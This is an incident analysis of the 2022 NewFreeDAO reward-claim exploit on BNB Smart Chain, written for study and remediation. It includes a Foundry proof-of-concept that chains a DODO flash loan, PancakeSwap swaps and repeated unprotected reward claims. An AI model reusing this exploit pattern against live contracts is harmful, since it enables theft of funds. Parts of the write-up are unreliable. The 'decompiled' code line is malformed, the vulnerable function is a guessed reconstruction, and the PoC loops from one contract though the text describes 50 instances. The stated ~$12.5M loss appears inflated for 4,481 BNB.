# NewFreeDAO — Flash Loan Reward Repeated Extraction Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | NewFreeDAO (NFD) |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | 4,481 BNB (~$12.5M) |
| **Attack Tx 1** | 2,952.97 BNB |
| **Attack Tx 2** | 1,412.77 BNB |
| **Attack Tx 3** | 115.57 BNB |
| **Attacker** | [0x22c9736d4fc73a8fa0eb436d2ce919f5849d6fd2](https://bscscan.com/address/0x22c9736d4fc73a8fa0eb436d2ce919f5849d6fd2) |
| **Attack Contract** | [0xa35ef9fa2f5e0527cb9fbb6f9d3a24cfed948863](https://bscscan.com/address/0xa35ef9fa2f5e0527cb9fbb6f9d3a24cfed948863) |
| **Vulnerable Contract** | [0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e](https://bscscan.com/address/0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e) |
| **WBNB-USDT Pair** | [0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae](https://bscscan.com/address/0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae) |
| **USDT-NFD Pair** | [0x26c0623847637095655b2868c3182b2285bdaeaf](https://bscscan.com/address/0x26c0623847637095655b2868c3182b2285bdaeaf) |
| **DODO Flash Loan** | [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7](https://bscscan.com/address/0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7) |
| **NFD Token** | [0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9](https://bscscan.com/address/0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | The `0x6811e3b9` reward function can be called repeatedly without access control, combined with an incorrect time-based reward calculation |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/NewFreeDAO_exp.sol) |

---
## 1. Vulnerability Overview

NewFreeDAO is a DeFi protocol based on the NFD token. Its reward claim function `0x6811e3b9` had no access control. The attacker flash borrowed 250 WBNB from DODO, purchased NFD tokens, then deployed 50 attack contract instances and repeatedly called `0x6811e3b9` from each instance. Each call disbursed excessive NFD due to a flawed time-based reward calculation. The attacker then swapped the accumulated NFD back to WBNB via PancakeSwap, netting a profit of 4,481 BNB.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable reward function (selector: 0x6811e3b9)
// Estimated function signature: claimReward() or harvest()
function claimReward() external {  // selector: 0x6811e3b9
    // ❌ No access control — callable by anyone
    // ❌ No validation of last claim timestamp

    // Time-based reward calculation (vulnerable version)
    uint256 elapsed = block.timestamp - lastClaimTime[msg.sender];
    uint256 reward = stakedBalance[msg.sender] * rewardRate * elapsed / 1e18;

    // ❌ Transfer before state update (not strictly a CEI violation, but)
    // ❌ In practice, elapsed calculation is buggy — reward is issued on every call
    nfdToken.transfer(msg.sender, reward);
    // lastClaimTime update missing or malfunctioning
}

// ✅ Correct reward function
mapping(address => uint256) public lastClaimTime;
mapping(address => uint256) public stakedBalance;
uint256 public constant CLAIM_INTERVAL = 1 days;

function claimReward() external {
    require(
        block.timestamp >= lastClaimTime[msg.sender] + CLAIM_INTERVAL,
        "Too early"
    );
    uint256 elapsed = block.timestamp - lastClaimTime[msg.sender];
    uint256 reward = stakedBalance[msg.sender] * rewardRate * elapsed / 1e18;

    lastClaimTime[msg.sender] = block.timestamp; // ✅ CEI: update state first
    require(reward > 0, "No reward");
    nfdToken.transfer(msg.sender, reward);
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**Decompiled_0x8b068e22.sol** — Entry point:
```solidity
// ❌ Root cause: `0x6811e3b9` reward function can be called repeatedly without access control, combined with an incorrect time-based reward calculation
    function func_nZHTch(address arg0, address arg1, uint256 arg2, ((address arg3, uint256 arg4) external {}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0x22c9...)
    │
    ├─[1] Flash borrow 250 WBNB from DODO
    │       Enter DPPFlashLoanCall() callback
    │
    ├─[2] Swap WBNB → USDT → NFD (PancakeRouter)
    │       swapExactTokensForTokensSupportingFeeOnTransferTokens()
    │
    ├─[3] Deploy 50 attack contract instances
    │       Distribute NFD to each instance
    │
    ├─[4] Repeatedly call 0x6811e3b9 from each instance
    │       └─ No access control → repeated reward claims succeed
    │           └─ Faulty time calculation → excessive NFD issued on every call
    │
    ├─[5] Swap accumulated NFD back to WBNB
    │
    ├─[6] Repay DODO flash loan
    │
    └─[7] Net profit: 4,481 BNB
              Tx1: 2,952.97 BNB
              Tx2: 1,412.77 BNB
              Tx3: 115.57 BNB
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IVulnerable {
    // selector: 0x6811e3b9
    function claimReward() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
}

contract NewFreeDAOExploit is Test {
    IDODO dodo = IDODO(0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7);
    IVulnerable vuln = IVulnerable(0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 NFD  = IERC20(0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9);
    IPancakeRouter router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc", 21_140_434);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB balance", WBNB.balanceOf(address(this)), 18);

        // [Step 1] Flash borrow 250 WBNB from DODO
        dodo.flashLoan(250 ether, 0, address(this), abi.encode("exploit"));

        emit log_named_decimal_uint("[End] WBNB balance", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 2] Swap WBNB → NFD
        WBNB.approve(address(router), type(uint256).max);
        address[] memory path = new address[](3);
        path[0] = address(WBNB);
        path[1] = 0x55d398326f99059fF775485246999027B3197955; // USDT
        path[2] = address(NFD);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount / 2, 0, path, address(this), block.timestamp
        );

        // [Step 3] Claim rewards repeatedly from 50 instances
        // ⚡ 0x6811e3b9 function is callable repeatedly without access control
        for (uint256 i = 0; i < 50; i++) {
            // Call claimReward() from each instance
            vuln.claimReward(); // selector: 0x6811e3b9
        }

        // [Step 4] Swap NFD back to WBNB
        NFD.approve(address(router), type(uint256).max);
        address[] memory revPath = new address[](3);
        revPath[0] = address(NFD);
        revPath[1] = 0x55d398326f99059fF775485246999027B3197955;
        revPath[2] = address(WBNB);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            NFD.balanceOf(address(this)), 0, revPath, address(this), block.timestamp
        );

        // [Step 5] Repay DODO flash loan
        WBNB.transfer(address(dodo), amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Repeated calls to reward function without access control |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Flash loan + unlimited reward claiming |
| **Attack Vector** | 50 repeated calls to `0x6811e3b9` reward function |
| **Preconditions** | Reward function has no access control or cooldown |
| **Impact** | Loss of 4,481 BNB (~$12.5M) |

---
## 6. Remediation Recommendations

1. **Reward function access control**: Validate that only users with a staked balance can call `claimReward()`.
2. **Enforce claim cooldown**: Require that at least 1 epoch has elapsed since the last claim before allowing another.
3. **Set reward cap**: Limit the maximum reward amount claimable in a single call.
4. **Prevent multi-contract attacks**: Use `tx.origin == msg.sender` or a contract address blacklist to prevent proxy claiming through contracts.

---
## 7. Lessons Learned

- **Scale of attack**: 4,481 BNB was one of the largest single attacks on BSC DeFi in 2022. It demonstrates how a simple missing access control check can lead to massive losses.
- **50-instance strategy**: Deploying multiple attack contracts is a technique to bypass per-address call limits. Since flash loans cover gas costs, profitability is maintained even with a large number of instances.
- **Function selector obfuscation**: Using a selector such as `0x6811e3b9` that does not reveal the function name does not improve security. All `external` functions must have access control applied by the same standards.